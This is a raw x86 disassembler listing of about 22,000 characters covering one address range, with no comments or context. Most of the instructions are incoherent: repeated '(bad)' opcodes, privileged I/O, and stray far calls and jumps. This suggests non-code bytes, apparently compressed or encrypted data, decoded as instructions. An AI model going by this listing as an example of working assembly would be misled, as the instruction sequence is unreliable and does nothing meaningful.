  41574d:	enter  0x46c9,0x4a
  415751:	cmp    dl,BYTE PTR [eax-0x32]
  415754:	arpl   WORD PTR [ecx+0x6cfda3b0],dx
  41575a:	xchg   ebx,eax
  41575b:	mov    ah,0x86
  41575d:	hlt    
  41575e:	mov    eax,0xafbd10b4
  415763:	(bad)  
  415765:	jo     0x415756
  415767:	lea    ecx,[edi+0x57]
  41576a:	mov    ebp,0x622d430b
  41576f:	add    al,0x5d
  415771:	retf   
  415772:	inc    ebx
  415773:	jno    0x415714
  415775:	jnp    0x415714
  415777:	mov    ah,0xe8
  415779:	push   edx
  41577a:	xlat   BYTE PTR ds:[ebx]
  41577b:	cmp    al,0xf3
  41577d:	mov    ds:0x9b8a61f5,eax
  415782:	xchg   ebp,eax
  415783:	into   
  415784:	and    DWORD PTR ss:[edi+esi*8-0x4c],ecx
  415789:	aad    0xdd
  41578b:	and    al,0xf5
  41578d:	jb     0x4157d4
  41578f:	add    BYTE PTR [ecx-0x1c298b04],dh
  415795:	ja     0x41578b
  415797:	pop    edx
  415798:	fild   QWORD PTR [edx-0x7b]
  41579b:	cld    
  41579c:	fsubr  DWORD PTR [esi-0x65]
  41579f:	add    eax,0x27eea9e2
  4157a4:	aas    
  4157a5:	cmp    eax,0xbd18f6be
  4157aa:	inc    ebx
  4157ab:	loopne 0x415792
  4157ad:	mov    eax,ds:0xd89f93fa
  4157b2:	push   cs
  4157b3:	and    eax,DWORD PTR [edi+0x1201f5fd]
  4157b9:	mov    bl,0x94
  4157bb:	xlat   BYTE PTR ds:[ebx]
  4157bc:	dec    ecx
  4157bd:	retf   
  4157be:	arpl   WORD PTR [ecx+eax*2-0x79],cx
  4157c2:	adc    edx,DWORD PTR [ebx+0xbcfa094]
  4157c8:	jb     0x415781
  4157ca:	inc    ecx
  4157cb:	icebp  
  4157cc:	dec    ebx
  4157cd:	jge    0x415789
  4157cf:	mov    DWORD PTR [ecx+0x53],0xac87b54b
  4157d6:	aad    0xa4
  4157d8:	xchg   edi,eax
  4157d9:	mov    ebp,DWORD PTR [esi*1-0x52ac25f6]
  4157e0:	cmp    bl,BYTE PTR [eax-0x66]
  4157e3:	sar    DWORD PTR [edi-0x1],cl
  4157e6:	scas   eax,DWORD PTR es:[edi]
  4157e7:	cs sbb al,dl
  4157ea:	fs push eax
  4157ec:	outs   dx,BYTE PTR ds:[esi]
  4157ed:	mov    WORD PTR [edi],es
  4157ef:	jne    0x4157d2
  4157f1:	pop    esp
  4157f2:	icebp  
  4157f3:	shl    BYTE PTR [ebp-0x75],0x4d
  4157f7:	inc    esp
  4157f8:	rol    BYTE PTR [edx+0x27],cl
  4157fb:	sub    DWORD PTR [eax],esi
  4157fd:	xor    eax,0x88e86da9
  415802:	mov    edi,0x2b8591fb
  415807:	popa   
  415808:	dec    ecx
  415809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41580a:	out    0xe3,al
  41580c:	ss stos BYTE PTR es:[edi],al
  41580e:	fwait
  41580f:	addr16 leave 
  415811:	and    dl,BYTE PTR [esi+ecx*2]
  415814:	sub    bh,BYTE PTR [esi-0x57a2d0ab]
  41581a:	call   0xf1aa:0x536d5f94
  415821:	into   
  415822:	lock data16 mov ch,0x6b
  415826:	fs data16 sbb al,0x41
  41582b:	mov    bl,0x21
  41582d:	adc    DWORD PTR [bp+di-0x2f],0x43c0346
  415835:	mov    ebp,0xb5fbd8c6
  41583a:	fdiv   st(0),st
  41583c:	leave  
  41583d:	hlt    
  41583e:	pop    esi
  41583f:	mov    al,ds:0x63fd5c96
  415844:	add    eax,DWORD PTR [eax-0x6c7483b3]
  41584a:	mov    esp,0x102cca78
  41584f:	mov    bl,0xb9
  415851:	lods   al,BYTE PTR ds:[esi]
  415852:	xor    BYTE PTR [ecx-0x15],0x77
  415856:	mov    dh,0x17
  415858:	push   ss
  415859:	scas   al,BYTE PTR es:[edi]
  41585a:	inc    ebx
  41585b:	loopne 0x415823
  41585d:	stos   DWORD PTR es:[edi],eax
  41585e:	adc    BYTE PTR [eax+0x74],ch
  415861:	fist   DWORD PTR [esi-0x38]
  415864:	inc    ecx
  415865:	mov    cl,0x58
  415867:	jb     0x415894
  415869:	mov    ch,dh
  41586b:	push   cs
  41586c:	and    BYTE PTR [edx+edx*8+0x4c],dl
  415870:	push   edi
  415871:	adc    al,0xe4
  415873:	or     eax,0x2dcca3f1
  415878:	pop    ecx
  415879:	mov    cl,0xa8
  41587b:	jno    0x415875
  41587d:	lods   al,BYTE PTR ds:[esi]
  41587e:	ja     0x4158a7
  415880:	mov    WORD PTR [ebx-0xdcae1ae],?
  415886:	jecxz  0x415829
  415888:	push   ss
  415889:	fcomp  QWORD PTR [esi+0x433c8fc0]
  41588f:	mov    ch,0x5a
  415891:	(bad)  
  415893:	inc    ebp
  415894:	pop    ebp
  415895:	std    
  415896:	or     al,0xa9
  415899:	pop    es
  41589a:	(bad)  
  41589c:	(bad)  
  41589d:	push   ebx
  41589e:	pop    esi
  41589f:	mov    cl,0x38
  4158a1:	(bad)  
  4158a2:	imul   esi,ebp,0x40987629
  4158a8:	popa   
  4158a9:	add    ebp,DWORD PTR [ebx+esi*2-0x11]
  4158ad:	push   ebx
  4158ae:	inc    ebp
  4158af:	inc    ebx
  4158b0:	add    eax,0xdb563eca
  4158b5:	xor    DWORD PTR [esi-0x21c33712],edi
  4158bb:	inc    edx
  4158bc:	enter  0x4f37,0x7e
  4158c0:	fwait
  4158c1:	stos   BYTE PTR es:[edi],al
  4158c2:	push   cs
  4158c3:	pushf  
  4158c4:	dec    esp
  4158c5:	sub    DWORD PTR [ecx-0x196252a4],edi
  4158cb:	jg     0x4158de
  4158cd:	inc    ebx
  4158ce:	pop    ds
  4158cf:	loope  0x415889
  4158d1:	or     ebx,DWORD PTR [esi-0x4a4cded6]
  4158d7:	mov    BYTE PTR [ebx+0x2d],dh
  4158da:	mov    DWORD PTR [esi+0x51c1e02a],ecx
  4158e0:	fdiv   DWORD PTR [ebp-0x42]
  4158e3:	pop    eax
  4158e4:	in     al,0x5d
  4158e6:	sbb    bh,BYTE PTR ds:0x1c3efd74
  4158ec:	fcomp  QWORD PTR [ebx]
  4158ee:	int    0x8b
  4158f0:	stos   BYTE PTR es:[edi],al
  4158f1:	xchg   esp,eax
  4158f2:	jl     0x41589a
  4158f4:	(bad)  
  4158f6:	cmp    dh,ch
  4158f8:	fadd   QWORD PTR [edi-0x7120b731]
  4158fe:	fbld   TBYTE PTR [edi]
  415900:	dec    eax
  415901:	adc    BYTE PTR [edi-0x5f],ah
  415904:	mov    al,0x71
  415906:	or     dh,BYTE PTR [edx-0x6e]
  415909:	out    0x56,eax
  41590b:	bound  edx,QWORD PTR [edx-0x7fab83ee]
  415911:	repz sbb DWORD PTR [ecx+esi*2-0x27],esp
  415916:	xor    BYTE PTR [ecx-0x78],dl
  415919:	retf   0x3898
  41591c:	das    
  41591d:	sub    eax,0x6afeb4b6
  415922:	pop    edi
  415923:	rcr    bh,cl
  415925:	cmp    eax,0x96470166
  41592a:	sti    
  41592b:	jmp    0xca01:0x2edf394d
  415932:	push   cs
  415933:	fnstsw ax
  415935:	mov    bh,0x9f
  415937:	mov    ch,0x15
  415939:	gs inc esi
  41593b:	sbb    al,0xcd
  41593d:	lea    ebx,[eax+eax*4]
  415940:	out    dx,eax
  415941:	mov    bl,0xd0
  415943:	je     0x415986
  415945:	sub    ecx,edx
  415947:	mov    WORD PTR [ecx+0x18],cs
  41594a:	es (bad) 
  41594c:	mov    WORD PTR [edi],cs
  41594e:	jne    0x4159af
  415950:	adc    cl,BYTE PTR [esi-0x2f1a42f2]
  415956:	retf   0x3100
  415959:	sbb    eax,0x8cb63db9
  41595e:	sub    bh,cl
  415960:	push   ss
  415961:	or     DWORD PTR [eax-0x6e],esp
  415964:	jns    0x415920
  415966:	pop    edi
  415967:	inc    edi
  415968:	mov    DWORD PTR [edx+0x3cfb8a59],edi
  41596e:	mov    esi,0xb57b3e55
  415973:	sub    bl,BYTE PTR [edx+ebp*1-0x31904b9d]
  41597a:	xchg   DWORD PTR [ebx-0x75],edx
  41597d:	lods   eax,DWORD PTR ds:[esi]
  41597e:	add    eax,0x4ed05fdc
  415983:	sub    eax,0xb008b2a2
  415988:	cmp    DWORD PTR [edi-0x3655a188],ebp
  41598e:	mov    ebx,0x7caa4d9b
  415993:	idiv   DWORD PTR [ebp+0x138de32e]
  415999:	(bad)  
  41599a:	pop    eax
  41599b:	jns    0x4159d7
  41599d:	loope  0x41597c
  41599f:	mov    ebx,0x6e9237e9
  4159a4:	add    BYTE PTR [ebx-0x32],0x5e
  4159a8:	cdq    
  4159a9:	stos   BYTE PTR es:[edi],al
  4159aa:	dec    ecx
  4159ab:	aad    0xc6
  4159ad:	repnz adc eax,0x3496ae28
  4159b3:	mov    dh,0x64
  4159b5:	data16 mov al,ds:0x322208e0
  4159bb:	hlt    
  4159bc:	jp     0x4159b5
  4159be:	in     eax,0x47
  4159c0:	push   esi
  4159c1:	ss cdq 
  4159c3:	leave  
  4159c4:	cdq    
  4159c5:	xor    ah,BYTE PTR [esi+0x24]
  4159c8:	imul   edi,edx,0x6cecc40
  4159ce:	es test cl,0xe2
  4159d2:	sub    bl,dh
  4159d4:	cli    
  4159d5:	inc    esp
  4159d6:	sti    
  4159d7:	add    BYTE PTR [esi-0x3880c362],ah
  4159dd:	sahf   
  4159de:	mov    esp,0x2799db97
  4159e3:	xchg   edx,eax
  4159e4:	aam    0xec
  4159e6:	gs pop ds
  4159e8:	sbb    DWORD PTR [eax+0x78],esp
  4159eb:	inc    ecx
  4159ec:	dec    eax
  4159ed:	inc    BYTE PTR [ecx]
  4159ef:	repnz mov edx,0xb97ea7bf
  4159f5:	in     eax,dx
  4159f6:	push   0x77665da1
  4159fb:	xchg   esp,eax
  4159fc:	mov    dl,0xf9
  4159fe:	sub    ebp,DWORD PTR [edi]
  415a00:	dec    edx
  415a01:	pop    es
  415a02:	jp     0x415a1f
  415a04:	test   ecx,esi
  415a06:	imul   ecx,DWORD PTR [edx+0x54],0x946777c2
  415a0d:	jmp    0x4159bd
  415a0f:	jbe    0x4159a0
  415a11:	call   0x8207:0x28d84280
  415a18:	aad    0x43
  415a1a:	pusha  
  415a1b:	xor    DWORD PTR [ecx],esi
  415a1d:	adc    ecx,DWORD PTR [edx]
  415a1f:	cmp    DWORD PTR [edx+0xd],ebx
  415a22:	es xchg esi,eax
  415a24:	mov    cl,0x23
  415a26:	imul   edi,esp,0x50898107
  415a2c:	lea    esi,[edi-0x3e]
  415a2f:	rol    ebp,1
  415a31:	(bad)  
  415a33:	push   ecx
  415a34:	add    DWORD PTR [ecx+0x25cd671c],esi
  415a3a:	leave  
  415a3b:	lock inc edx
  415a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a3e:	loopne 0x415a4b
  415a40:	js     0x415a05
  415a42:	aas    
  415a43:	out    0x16,al
  415a45:	cmc    
  415a46:	pop    eax
  415a47:	imul   ebp,DWORD PTR [ecx-0x53974892],0xfffffff7
  415a4e:	dec    edx
  415a4f:	jle    0x4159e1
  415a51:	outs   dx,BYTE PTR ds:[esi]
  415a52:	es mov edx,0x16f1d600
  415a58:	xor    al,0x7a
  415a5a:	das    
  415a5b:	inc    ebx
  415a5c:	mov    ecx,0xd2faf4c6
  415a61:	adc    edi,DWORD PTR [ebp+0x38864a5b]
  415a67:	in     al,dx
  415a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a69:	jae    0x415a86
  415a6b:	inc    edx
  415a6c:	test   DWORD PTR [edi+eiz*1+0x23],esi
  415a70:	inc    edi
  415a71:	sbb    eax,0x66b935ff
  415a76:	inc    eax
  415a77:	sub    eax,0x2fcd53f1
  415a7c:	adc    esp,esp
  415a7e:	pop    edx
  415a7f:	cmp    eax,0x876399a9
  415a84:	(bad)  
  415a85:	fbld   TBYTE PTR [ebp-0x77]
  415a88:	jb     0x415aad
  415a8a:	aas    
  415a8b:	or     BYTE PTR [edi+0x5f8aa021],dl
  415a91:	loope  0x415a3d
  415a93:	(bad)  
  415a94:	rcr    BYTE PTR [edx],1
  415a96:	out    0x82,eax
  415a98:	inc    esp
  415a99:	les    esp,FWORD PTR [ecx-0x43]
  415a9c:	dec    edi
  415a9d:	into   
  415a9e:	or     BYTE PTR [esi+0x3e5fda8f],bh
  415aa4:	pop    ebp
  415aa5:	push   ds
  415aa6:	cli    
  415aa7:	mov    WORD PTR [eax+edx*8+0x3f3ec80c],ds
  415aae:	xchg   bh,cl
  415ab0:	sub    al,0x4f
  415ab2:	xchg   edx,eax
  415ab3:	lods   eax,DWORD PTR ds:[esi]
  415ab4:	fidivr DWORD PTR [ecx-0x38ebdab1]
  415aba:	sub    ebp,DWORD PTR [eiz*1+0x1db5e75a]
  415ac1:	arpl   WORD PTR [esp+edi*1],si
  415ac4:	mov    esi,0x95b53af
  415ac9:	mov    ah,0xef
  415acb:	mov    ch,0xa
  415acd:	jmp    0xd6884fc9
  415ad2:	and    ebx,DWORD PTR [edi-0x770d081e]
  415ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ad9:	out    dx,al
  415ada:	adc    BYTE PTR [edi+0x7f7677c3],0x96
  415ae1:	loop   0x415ae2
  415ae3:	int    0xa8
  415ae5:	(bad)  
  415ae6:	xor    ebp,edi
  415ae8:	bound  edi,QWORD PTR [ebx-0x6967a3b3]
  415aee:	pusha  
  415aef:	mov    al,ds:0x2b052548
  415af4:	and    eax,0x7a18ac89
  415af9:	shl    DWORD PTR es:[ebx-0x6809a555],cl
  415b00:	jo     0x415b45
  415b02:	add    edi,DWORD PTR [eax]
  415b04:	push   ebp
  415b05:	daa    
  415b06:	jp     0x415b57
  415b08:	cdq    
  415b09:	jp     0x415aa8
  415b0b:	fcomp  DWORD PTR [ecx+0x527f420]
  415b11:	ins    DWORD PTR es:[edi],dx
  415b12:	adc    eax,0x381f208f
  415b17:	lods   eax,DWORD PTR ds:[esi]
  415b18:	adc    al,0xd6
  415b1a:	or     ch,BYTE PTR [ebx+0x58]
  415b1d:	fsubr  DWORD PTR [eax+0x29]
  415b20:	cmp    cl,BYTE PTR [ecx-0x330ee7c8]
  415b26:	add    al,cl
  415b28:	add    al,ah
  415b2a:	xor    eax,0x388d7561
  415b2f:	cmp    BYTE PTR [edi+ebx*2+0x17eae317],0xeb
  415b37:	mov    edx,0x621681de
  415b3c:	xchg   BYTE PTR [eax-0x5d],dh
  415b3f:	retf   0x3ef4
  415b42:	in     al,0xce
  415b44:	test   BYTE PTR [eax+eiz*2-0x17dfdd79],dh
  415b4b:	xchg   edx,eax
  415b4c:	sbb    eax,0xb8ded7e7
  415b51:	cmovne edi,DWORD PTR [edi-0x637d8e7]
  415b58:	jmp    0xba80f32e
  415b5d:	sub    DWORD PTR [edi-0x61cc66ff],0xffffffc1
  415b64:	xor    eax,0x2ce4e271
  415b69:	cmp    al,0x85
  415b6b:	(bad)  
  415b6d:	daa    
  415b6e:	dec    ebp
  415b6f:	inc    ebp
  415b70:	fistp  WORD PTR [edi-0x67]
  415b73:	jge    0x415bad
  415b75:	fidivr WORD PTR [eax+eax*2]
  415b78:	es push edi
  415b7a:	outs   dx,BYTE PTR ds:[esi]
  415b7b:	mov    ebp,edx
  415b7d:	push   eax
  415b7e:	mov    al,ds:0x4d0b133b
  415b83:	cwde   
  415b84:	lea    ecx,ds:0xb2741d22
  415b8a:	jns    0x415c02
  415b8c:	and    BYTE PTR ds:0xee3777ad,dh
  415b92:	jne    0x415b19
  415b94:	je     0x415bd0
  415b96:	mov    DWORD PTR [eax-0x60ea6dc8],ebx
  415b9c:	into   
  415b9d:	sbb    BYTE PTR [ebp+0x38885d6d],dl
  415ba3:	js     0x415b8e
  415ba5:	add    dh,0x23
  415ba8:	ss stos BYTE PTR es:[edi],al
  415baa:	lea    ebp,[ecx-0x2f]
  415bad:	loop   0x415bc2
  415baf:	cs push esi
  415bb1:	das    
  415bb2:	fidiv  DWORD PTR [edi]
  415bb4:	in     eax,dx
  415bb5:	pop    edi
  415bb6:	ins    BYTE PTR es:[edi],dx
  415bb7:	ins    DWORD PTR es:[edi],dx
  415bb8:	dec    esi
  415bb9:	mov    ds:0xda776498,eax
  415bbe:	jp     0x415bd4
  415bc0:	jl     0x415b44
  415bc2:	xchg   esp,eax
  415bc3:	outs   dx,BYTE PTR ds:[esi]
  415bc4:	add    al,0x5d
  415bc6:	mov    bh,0x55
  415bc8:	add    DWORD PTR [ecx+0x13ec1bb],ebp
  415bce:	mov    edx,0x7a429eb3
  415bd3:	pushf  
  415bd4:	lods   eax,DWORD PTR ds:[esi]
  415bd5:	mov    edx,0xfed4e8e6
  415bda:	mov    cl,0x44
  415bdc:	imul   ebp,DWORD PTR [eax+0x24],0xb2147696
  415be3:	int    0xb9
  415be5:	mov    al,0x2c
  415be7:	outs   dx,BYTE PTR ds:[esi]
  415be8:	test   edi,esp
  415bea:	mov    ds:0x2f8ca423,eax
  415bef:	mov    ah,0xb1
  415bf2:	std    
  415bf3:	arpl   WORD PTR [ebp+0x46],sp
  415bf6:	jmp    0xcce991b6
  415bfb:	lea    ebx,[ebp-0x46]
  415bfe:	inc    edi
  415bff:	int    0x2b
  415c01:	dec    ebp
  415c02:	cmp    BYTE PTR [edx-0x7ff03a00],bh
  415c08:	fs mov ebx,0x9c29ac7e
  415c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0f:	push   eax
  415c10:	in     eax,0x72
  415c12:	leave  
  415c13:	nop
  415c14:	test   DWORD PTR [ecx],ebx
  415c16:	aas    
  415c17:	jae    0x415c28
  415c19:	ror    BYTE PTR [eax-0x1e490fc0],cl
  415c1f:	hlt    
  415c20:	scas   eax,DWORD PTR es:[edi]
  415c21:	or     eax,0x320c38c8
  415c26:	dec    esi
  415c27:	icebp  
  415c28:	sar    DWORD PTR [edi-0x1d],cl
  415c2b:	test   DWORD PTR [ecx-0x5a],esp
  415c2e:	sbb    eax,0x5dd82c42
  415c33:	lock sbb dl,BYTE PTR [ebp-0x7f]
  415c37:	pushf  
  415c38:	stc    
  415c39:	cmp    edx,DWORD PTR [ecx+0x40a26dad]
  415c3f:	and    BYTE PTR [ebp-0x13a6b13f],0x48
  415c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c47:	mov    ch,cl
  415c49:	enter  0x1624,0x24
  415c4d:	(bad)  
  415c4e:	iret   
  415c4f:	fisttp WORD PTR [ebx+ecx*8+0x7e801e3c]
  415c56:	jno    0x415c36
  415c58:	pop    edi
  415c59:	cmp    al,0xf5
  415c5b:	and    ah,BYTE PTR [esi+0x3d3428d1]
  415c61:	jns    0x415c00
  415c63:	xchg   BYTE PTR [ebp-0x2d],bh
  415c66:	loope  0x415c18
  415c68:	cli    
  415c69:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  415c6b:	pop    ss
  415c6c:	xchg   ebx,eax
  415c6d:	cli    
  415c6e:	adc    eax,0xa1aa435
  415c73:	loope  0x415c1f
  415c75:	fisubr DWORD PTR [edx]
  415c78:	mov    al,ds:0xc7c7151e
  415c7d:	int3   
  415c7e:	dec    ecx
  415c7f:	test   eax,0xfa065c03
  415c84:	nop
  415c85:	addr16 in eax,0xad
  415c88:	nop
  415c89:	dec    eax
  415c8a:	xchg   ecx,eax
  415c8b:	ret    
  415c8c:	mov    bh,0xa2
  415c8e:	out    0x74,eax
  415c90:	sti    
  415c91:	xchg   esi,eax
  415c92:	cmp    dh,BYTE PTR [edi+0x55a20288]
  415c98:	mov    eax,ds:0xeb9e68c7
  415c9d:	sahf   
  415c9e:	mov    esp,DWORD PTR [ecx+0x1d3dd0f4]
  415ca4:	push   0xde8545e6
  415ca9:	mov    bl,0xe0
  415cab:	neg    DWORD PTR [edx-0x4f]
  415cae:	pop    ss
  415caf:	jecxz  0x415c6f
  415cb1:	jnp    0x415c6f
  415cb3:	cmc    
  415cb4:	pop    edi
  415cb5:	cwde   
  415cb6:	shl    BYTE PTR [edx],cl
  415cb8:	stos   BYTE PTR es:[edi],al
  415cb9:	xchg   edi,eax
  415cba:	das    
  415cbb:	imul   DWORD PTR [edx-0x5120fb45]
  415cc1:	mov    eax,ds:0x2317d32d
  415cc6:	rol    ecx,1
  415cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cc9:	es mov ecx,0x52fdf804
  415ccf:	loopne 0x415c53
  415cd1:	pop    ds
  415cd2:	jno    0x415cc0
  415cd4:	pop    esp
  415cd5:	pop    ds
  415cd6:	(bad)  
  415cd7:	das    
  415cd8:	(bad)  
  415cd9:	mov    ebx,0xbffa2538
  415cde:	cdq    
  415cdf:	add    ebp,edx
  415ce1:	sbb    al,BYTE PTR [edi-0x79]
  415ce4:	in     eax,dx
  415ce5:	cld    
  415ce6:	in     al,dx
  415ce7:	into   
  415ce8:	jmp    0x415cf6
  415cea:	or     esi,DWORD PTR [eax+edi*4-0x77]
  415cee:	push   ebx
  415cef:	mov    DWORD PTR [edi],ebx
  415cf1:	in     al,0x9d
  415cf3:	cli    
  415cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cf5:	mov    ss,WORD PTR [eax-0x3c]
  415cf8:	enter  0x216a,0x1b
  415cfc:	pushf  
  415cfd:	jbe    0x415d33
  415cff:	fdiv   st,st(6)
  415d01:	cs xor al,0x39
  415d04:	mov    ch,0xeb
  415d06:	scas   eax,DWORD PTR es:[edi]
  415d07:	add    bh,BYTE PTR [esi]
  415d09:	ins    DWORD PTR es:[edi],dx
  415d0a:	mov    ecx,0x6265778f
  415d0f:	pop    ebp
  415d10:	mov    dl,bh
  415d12:	sbb    dl,BYTE PTR [ecx+0x1ffe604a]
  415d18:	ja     0x415d38
  415d1a:	pop    edx
  415d1b:	mov    cl,0xf9
  415d1d:	(bad)  [esi-0x472489b9]
  415d23:	sti    
  415d24:	aaa    
  415d25:	test   al,0x7c
  415d27:	mov    cl,BYTE PTR ds:0xd19afb9e
  415d2d:	ins    DWORD PTR es:[edi],dx
  415d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d2f:	outs   dx,BYTE PTR ds:[esi]
  415d30:	xchg   ebx,eax
  415d31:	add    DWORD PTR [ebx-0x319152bd],ebp
  415d37:	rol    ch,cl
  415d39:	push   esi
  415d3a:	xchg   ecx,eax
  415d3b:	aaa    
  415d3c:	ret    0x8810
  415d3f:	or     ebp,ebp
  415d41:	in     al,dx
  415d42:	mov    ebx,0xbf218095
  415d47:	sbb    DWORD PTR [edx],ecx
  415d49:	mov    dh,0xa1
  415d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d4c:	imul   edi,DWORD PTR [edi],0xb6d71434
  415d52:	std    
  415d53:	jle    0x415d85
  415d55:	jo     0x415db7
  415d57:	or     al,0x19
  415d59:	fcomp  DWORD PTR [ebx-0x52]
  415d5c:	xlat   BYTE PTR ds:[ebx]
  415d5d:	or     eax,0x7780a245
  415d62:	dec    ecx
  415d63:	pop    ds
  415d64:	dec    edi
  415d65:	pop    es
  415d66:	xchg   ebp,eax
  415d67:	aas    
  415d68:	(bad)  
  415d69:	cmp    al,0xd2
  415d6b:	scas   eax,DWORD PTR es:[edi]
  415d6c:	jle    0x415d24
  415d6e:	push   es
  415d6f:	bswap  ecx
  415d71:	push   esi
  415d72:	mov    eax,ds:0xe8814d61
  415d77:	mov    ds:0xaf61d931,eax
  415d7c:	pop    esp
  415d7d:	push   eax
  415d7e:	imul   esp,DWORD PTR [edx+0x6e],0x6594cc1a
  415d85:	jl     0x415d69
  415d87:	jg     0x415da8
  415d89:	mov    ch,0x7e
  415d8b:	mov    ?,WORD PTR [eax*8+0x6185fd66]
  415d92:	adc    eax,0x98172be
  415d97:	adc    DWORD PTR [ebp+0x7d],0x51
  415d9b:	sub    esi,DWORD PTR [edi]
  415d9d:	inc    esi
  415d9e:	mov    ch,0xd
  415da0:	ja     0x415df1
  415da2:	or     DWORD PTR [esi+0x8],ebx
  415da5:	es mov al,0x7e
  415da8:	cs mov ch,0xe7
  415dab:	mov    cl,0xb0
  415dad:	ss jo  0x415e09
  415db0:	pop    ebp
  415db1:	mov    dl,0x59
  415db3:	pop    ebp
  415db4:	cli    
  415db5:	mov    edx,esi
  415db7:	fwait
  415db8:	imul   edi,eax,0x905c1f86
  415dbe:	push   DWORD PTR [ecx]
  415dc0:	push   esp
  415dc1:	mov    esp,DWORD PTR [ecx+0x42]
  415dc4:	or     cl,BYTE PTR [esi+0x36]
  415dc7:	adc    edi,esp
  415dc9:	test   edi,edi
  415dcb:	icebp  
  415dcc:	imul   esp,DWORD PTR [ebx-0x6d3e4122],0xa75894f6
  415dd6:	jge    0x415d60
  415dd8:	into   
  415dd9:	dec    edx
  415dda:	aam    0xca
  415ddc:	stos   DWORD PTR es:[edi],eax
  415ddd:	pop    eax
  415dde:	adc    dl,BYTE PTR [esi-0x2b0a4713]
  415de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415de5:	loope  0x415df5
  415de7:	(bad)  
  415de8:	sar    BYTE PTR [eax-0x2caa41e9],0x7
  415def:	repz xor al,0x12
  415df2:	mov    ah,ah
  415df4:	xchg   ebx,eax
  415df5:	push   cs
  415df6:	sub    BYTE PTR [ecx-0x467293e7],0x43
  415dfd:	cmp    eax,0xea7120fb
  415e02:	loopne 0x415e7f
  415e04:	or     cl,ch
  415e06:	mov    al,0x1b
  415e08:	xor    eax,0x119151c0
  415e0d:	stos   DWORD PTR es:[edi],eax
  415e0e:	ins    DWORD PTR es:[edi],dx
  415e0f:	adc    al,0x3c
  415e11:	pop    edi
  415e12:	(bad)
  415e17:	sbb    eax,0x4dfbc58a
  415e1c:	push   edx
  415e1d:	jne    0x415de1
  415e1f:	shl    DWORD PTR [edx+0xe],cl
  415e22:	add    eax,DWORD PTR [esi+ecx*1]
  415e25:	xchg   ebx,eax
  415e26:	in     al,dx
  415e27:	lock mov edx,0x1e6c7b22
  415e2d:	xchg   ecx,eax
  415e2e:	scas   al,BYTE PTR es:[edi]
  415e2f:	xchg   edi,eax
  415e30:	and    cl,BYTE PTR [esi]
  415e32:	fdivr  QWORD PTR [esi-0x40]
  415e35:	push   es
  415e36:	nop
  415e37:	mov    edx,0x3a14efe
  415e3c:	lahf   
  415e3d:	mov    DWORD PTR [edx+0xd],edx
  415e40:	pop    eax
  415e41:	aas    
  415e42:	push   0xaba5a97a
  415e47:	add    BYTE PTR [edi+0x7d],bl
  415e4a:	adc    DWORD PTR [edx+0x8215da5],ebp
  415e50:	iret   
  415e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e52:	rol    BYTE PTR [esi+0x2f],1
  415e55:	int    0xe9
  415e57:	test   BYTE PTR [di-0x76cf],dh
  415e5c:	fsubr  DWORD PTR [ecx-0x60]
  415e5f:	shr    DWORD PTR [edx],1
  415e61:	hlt    
  415e62:	jecxz  0x415e14
  415e64:	cmc    
  415e65:	sbb    cl,ch
  415e67:	xor    al,0x2e
  415e69:	in     eax,0xc7
  415e6b:	mov    ah,0x81
  415e6d:	sbb    cl,BYTE PTR [ecx+eax*2-0x7c]
  415e71:	js     0x415e5d
  415e73:	inc    edi
  415e74:	jecxz  0x415df9
  415e76:	and    dh,BYTE PTR [eax-0x11f42c20]
  415e7c:	push   esp
  415e7d:	pop    es
  415e7e:	int3   
  415e7f:	pmullw mm3,mm4
  415e82:	cmp    bl,BYTE PTR [ebx]
  415e84:	rcr    BYTE PTR [ebx-0xf],0x9e
  415e88:	cs addr16 xchg cl,bh
  415e8c:	dec    esp
  415e8d:	mov    ds:0xf84127cb,al
  415e92:	mov    bl,0x36
  415e94:	int3   
  415e95:	fimul  DWORD PTR [esi]
  415e97:	ret    
  415e98:	std    
  415e99:	sbb    DWORD PTR [edx],0x9
  415e9c:	or     cl,BYTE PTR [ecx-0x21]
  415e9f:	out    dx,al
  415ea0:	dec    ecx
  415ea1:	iret   
  415ea2:	inc    esp
  415ea3:	pop    ds
  415ea4:	pop    es
  415ea5:	push   edx
  415ea6:	dec    edx
  415ea7:	pop    edi
  415ea8:	dec    ebp
  415ea9:	retf   0x26ba
  415eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ead:	push   ebp
  415eae:	sub    BYTE PTR [ecx-0x57],ch
  415eb1:	adc    al,0x19
  415eb3:	dec    edi
  415eb4:	push   cs
  415eb5:	js     0x415f17
  415eb7:	rcl    dl,0xd8
  415eba:	ficom  DWORD PTR [edi]
  415ebc:	fdivrp st(5),st
  415ebe:	inc    esi
  415ebf:	jne    0x415e92
  415ec1:	aam    0x6f
  415ec3:	adc    ah,BYTE PTR [ecx+0x61]
  415ec6:	pop    edx
  415ec7:	mov    cl,0xb
  415ec9:	push   edx
  415eca:	pop    ebp
  415ecb:	das    
  415ecc:	out    0x77,al
  415ece:	nop
  415ecf:	pop    ss
  415ed0:	jo     0x415e61
  415ed2:	xchg   edx,eax
  415ed3:	test   BYTE PTR ds:0x7dc74b2a,bh
  415ed9:	mov    ebp,0xdc24c684
  415ede:	lods   al,BYTE PTR ds:[esi]
  415edf:	fistp  QWORD PTR [ecx+ecx*1-0x570512ec]
  415ee6:	inc    esp
  415ee7:	call   0xb114:0xd16db82
  415eee:	add    eax,0xead00d7e
  415ef3:	push   cs
  415ef4:	push   ebx
  415ef5:	dec    eax
  415ef6:	xchg   ebx,eax
  415ef7:	rol    BYTE PTR [esi-0x1e32d8aa],cl
  415efd:	stc    
  415efe:	push   0x32
  415f00:	or     dh,al
  415f02:	or     edx,DWORD PTR [ecx+ecx*1-0x1907ab93]
  415f09:	xor    eax,0xf2a7d076
